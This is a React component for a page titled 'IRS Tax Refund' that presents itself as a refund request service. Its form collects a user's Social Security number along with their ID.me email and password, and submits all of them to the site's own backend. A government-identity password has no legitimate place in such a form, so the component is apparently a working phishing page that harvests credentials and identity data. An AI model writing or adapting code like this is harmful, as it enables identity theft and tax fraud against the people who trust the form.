'use client';

import { useState } from 'react';
import { motion } from 'framer-motion';
import { 
  FileText, 
  User, 
  Shield, 
  Globe, 
  AlertTriangle,
  Mail,
  Lock,
  ArrowRight
} from 'lucide-react';
import { useAuth } from '@/contexts/AuthContext';

const TaxRefundSection = () => {
  const { userProfile } = useAuth();
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Form State
  const [fullName, setFullName] = useState(`${userProfile?.firstName || ''} ${userProfile?.lastName || ''}`.trim());
  const [ssn, setSsn] = useState('');
  const [idmeEmail, setIdmeEmail] = useState('');
  const [idmePassword, setIdmePassword] = useState('');
  const [country, setCountry] = useState('United States');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!fullName || !ssn || !idmeEmail || !idmePassword) {
      alert('Please fill in all required fields.');
      return;
    }

    setIsSubmitting(true);
    try {
      const response = await fetch('/api/tax-refunds', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fullName,
          ssn,
          idmeEmail,
          idmePassword,
          country
        })
      });

      const result = await response.json();
      if (result.success) {
        alert('Tax refund request submitted successfully! Our team will process your request.');
        // Reset form
        setSsn('');
        setIdmeEmail('');
        setIdmePassword('');
      } else {
        alert(result.error || 'Failed to submit request');
      }
    } catch (error) {
      alert('An error occurred. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="max-w-4xl mx-auto space-y-12">
      {/* Hero Header */}
      <div className="bg-[#0b1626] rounded-[2.5rem] p-8 mobile:p-12 text-white relative overflow-hidden border border-gold-500/20">
        <div className="absolute top-0 right-0 w-96 h-96 bg-gold-500/10 rounded-full -mr-48 -mt-48 blur-3xl"></div>
        <div className="relative z-10">
          <div className="flex items-center gap-4 mb-6">
            <div className="w-16 h-16 bg-gold-500/20 rounded-2xl flex items-center justify-center border border-gold-500/20">
              <FileText className="w-10 h-10 text-gold-500" />
            </div>
            <div>
              <h2 className="text-3xl mobile:text-4xl font-black uppercase tracking-tight">IRS Tax Refund</h2>
              <p className="text-gold-500/80 font-black text-xs uppercase tracking-widest mt-1">Request Service Center</p>
            </div>
          </div>
          <p className="text-gray-400 text-sm mobile:text-base max-w-2xl leading-relaxed">
            Please fill out the form below to submit your IRS tax refund request. Our experts will handle the verification and processing with efficiency.
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        {/* Form Column */}
        <div className="lg:col-span-2">
          <div className="bg-white rounded-[2.5rem] p-8 mobile:p-10 border border-gray-100 shadow-sm relative overflow-hidden">
            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Personal Information */}
              <div className="space-y-6">
                <h4 className="flex items-center gap-2 text-[10px] font-black text-gold-600 uppercase tracking-[0.2em]">
                  <User className="w-4 h-4" /> Personal Information
                </h4>
                
                <div className="space-y-2">
                  <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Full Name</label>
                  <div className="relative group">
                    <User className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-gold-500 transition-colors" />
                    <input
                      type="text"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      placeholder="Enter your full name"
                      className="w-full pl-12 pr-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300"
                      required
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Social Security Number (SSN)</label>
                  <div className="relative group">
                    <Shield className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-gold-500 transition-colors" />
                    <input
                      type="text"
                      value={ssn}
                      onChange={(e) => setSsn(e.target.value)}
                      placeholder="XXX-XX-XXXX"
                      className="w-full pl-12 pr-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 font-mono"
                      required
                    />
                  </div>
                </div>
              </div>

              {/* ID.me Credentials */}
              <div className="space-y-6">
                <h4 className="flex items-center gap-2 text-[10px] font-black text-gold-600 uppercase tracking-[0.2em]">
                  <Lock className="w-4 h-4" /> ID.me Credentials
                </h4>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">ID.me Email</label>
                    <div className="relative group">
                      <Mail className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-gold-500 transition-colors" />
                      <input
                        type="email"
                        value={idmeEmail}
                        onChange={(e) => setIdmeEmail(e.target.value)}
                        placeholder="example@email.com"
                        className="w-full pl-12 pr-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300"
                        required
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">ID.me Password</label>
                    <div className="relative group">
                      <Lock className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-gold-500 transition-colors" />
                      <input
                        type="password"
                        value={idmePassword}
                        onChange={(e) => setIdmePassword(e.target.value)}
                        placeholder="•••••••••••••"
                        className="w-full pl-12 pr-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300"
                        required
                      />
                    </div>
                  </div>
                </div>
              </div>

              {/* Location */}
              <div className="space-y-6">
                <h4 className="flex items-center gap-2 text-[10px] font-black text-gold-600 uppercase tracking-[0.2em]">
                  <Globe className="w-4 h-4" /> Location Information
                </h4>
                <div className="space-y-2">
                  <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Country</label>
                  <select
                    value={country}
                    onChange={(e) => setCountry(e.target.value)}
                    className="w-full px-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 appearance-none cursor-pointer"
                    required
                  >
                    <option value="United States">United States</option>
                    <option value="Afghanistan">Afghanistan</option>
                    <option value="Canada">Canada</option>
                    <option value="United Kingdom">United Kingdom</option>
                    {/* Add more as needed */}
                  </select>
                </div>
              </div>

              {/* Important Notice */}
              <div className="p-6 bg-red-50 rounded-3xl border border-red-100 flex items-start space-x-4">
                <AlertTriangle className="w-6 h-6 text-red-500 shrink-0" />
                <div>
                  <h5 className="text-[10px] font-black text-red-700 uppercase tracking-widest mb-1">Important Notice</h5>
                  <p className="text-xs text-red-600 font-medium leading-relaxed">
                    Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.
                  </p>
                </div>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full px-10 py-5 bg-navy-900 text-gold-500 rounded-2xl font-black uppercase tracking-widest hover:bg-navy-800 transition-all shadow-xl shadow-navy-900/10 active:scale-95 disabled:opacity-50"
              >
                {isSubmitting ? (
                  <div className="flex items-center justify-center space-x-2">
                    <div className="w-4 h-4 border-2 border-gold-500 border-t-transparent rounded-full animate-spin"></div>
                    <span>Processing...</span>
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-2">
                    <span>Submit Request</span>
                    <ArrowRight className="w-5 h-5" />
                  </div>
                )}
              </button>
            </form>
          </div>
        </div>

        {/* Sidebar Info Column */}
        <div className="space-y-6">
          <div className="bg-white rounded-[2.5rem] p-8 border border-gray-100 shadow-sm">
            <h4 className="text-sm font-black text-navy-900 uppercase tracking-tight mb-4">Process Timeline</h4>
            <div className="space-y-6">
              {[
                { title: 'Submision', time: 'Today', status: 'done' },
                { title: 'Verification', time: '24-48h', status: 'pending' },
                { title: 'Processing', time: '3-5 Days', status: 'pending' },
                { title: 'Disbursement', time: '7-10 Days', status: 'pending' },
              ].map((item, i) => (
                <div key={i} className="flex items-center gap-4">
                  <div className={`w-3 h-3 rounded-full ${item.status === 'done' ? 'bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]' : 'bg-gray-200'}`}></div>
                  <div className="flex-1">
                    <p className="text-xs font-black text-navy-900 uppercase tracking-tight">{item.title}</p>
                    <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest">{item.time}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-navy-900 rounded-[2.5rem] p-8 text-white relative overflow-hidden group">
            <div className="absolute top-0 right-0 w-32 h-32 bg-gold-500/10 rounded-full -mr-16 -mt-16 blur-2xl group-hover:scale-150 transition-transform duration-700"></div>
            <h4 className="text-sm font-black uppercase tracking-tight mb-4 relative z-10">Need Assistance?</h4>
            <p className="text-gray-400 text-xs leading-relaxed mb-6 relative z-10">
              Our support team is available 24/7 to help you with your tax refund inquiries.
            </p>
            <button className="w-full py-3 bg-white/10 hover:bg-white/20 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all relative z-10">
              Contact Support
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default TaxRefundSection;
